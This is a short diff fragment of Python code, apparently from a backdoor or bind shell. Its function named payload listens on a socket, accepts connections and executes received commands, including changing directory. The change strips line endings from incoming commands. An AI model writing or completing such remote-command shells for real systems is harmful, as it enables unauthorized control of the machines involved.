@@ -13,7 +13,7 @@ def payload():
     s.listen(5)
     while True:
         c,a = s.accept()
-        command = c.recv(1024)
+        command = c.recv(1024).strip("\r").strip("\n")
         if command[:3] == "cd":
             try:
                 os.chdir(command[3:])
